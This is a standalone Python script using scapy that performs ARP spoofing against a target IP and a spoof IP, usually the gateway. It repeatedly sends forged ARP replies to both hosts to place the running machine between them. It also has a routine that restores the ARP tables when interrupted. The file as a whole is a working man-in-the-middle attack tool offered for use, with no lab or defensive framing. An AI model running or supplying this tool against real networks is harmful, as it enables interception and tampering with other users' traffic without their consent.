#!/usr/bin/python3
import argparse
import scapy.all as sp
import sys
import time

def set_arguments(p):
    p.add_argument('--target', dest='target_ip', help='Provide a Target IP Address (IPv4)')
    p.add_argument('--spoof', dest='spoof_ip', help='Provide a Spoof IP Address, generally the gateway IP (IPv4)')

def get_arguments(p):
    arguments = p.parse_args()
    if arguments.target_ip is None:
        p.error(f"Please specidy a target IP. Type {sys.argv[0]} -h for more info.")
    elif arguments.spoof_ip is None:
        p.error(f"Please specidy a target IP. Type {sys.argv[0]} -h for more info.")
    else:
        return arguments

def scan_ip(ip):
    arp_req = sp.ARP(pdst=ip) # Create ARP request packet
    broadcast = sp.Ether(dst='ff:ff:ff:ff:ff:ff') # Create broadcast channel packet
    arp_req_broad = broadcast / arp_req # Merge options in one packet
    # Send a combined custom packet with timeout of 1 second and accepting the response packets => [answered, unanswered]
    answered, _ = sp.srp(arp_req_broad, timeout=1, verbose=False)
    client = {'ip':answered[0][1].psrc, 'mac': answered[0][1].hwsrc}
    return client
    
def spoof(target_ip, spoof_ip):
    target_mac = scan_ip(target_ip).get('mac') # Get MAC address of the target ip
    # Creating an ARP response packet with destination IP as target IP,
    # destination MAC as target MAC and source IP as the gateway IP
    target_pkt = sp.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    sp.send(target_pkt, verbose=False) # sending the packet

def restore(dst_ip, src_ip):
    # Function to restore the ARP Tables by sending the true packets
    dst_mac = scan_ip(dst_ip).get('mac')
    src_mac = scan_ip(src_ip).get('mac')
    rst_pkt = sp.ARP(op=2, pdst=dst_ip, hwdst=dst_mac, psrc=src_ip, hwsrc=src_mac)
    sp.send(rst_pkt, verbose=False, count=4)
    
    
def main(args):    
    pktcount = 0
    
    try:
        while True:
            spoof(args.target_ip, args.spoof_ip)
            spoof(args.spoof_ip, args.target_ip)
            pktcount += 2
            print(f'\r[+] Packets Sent: {pktcount}', end='')
            time.sleep(2)
    
    except PermissionError:
        print('[!] Plaese run the script as root')
    
    except KeyboardInterrupt:
        restore(args.target_ip, args.spoof_ip)
        restore(args.spoof_ip, args.target_ip)
        print('\n[+] Restored ARP Tables... Exiting.')
        
if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    set_arguments(parser)
    args = get_arguments(parser)
    main(args)
    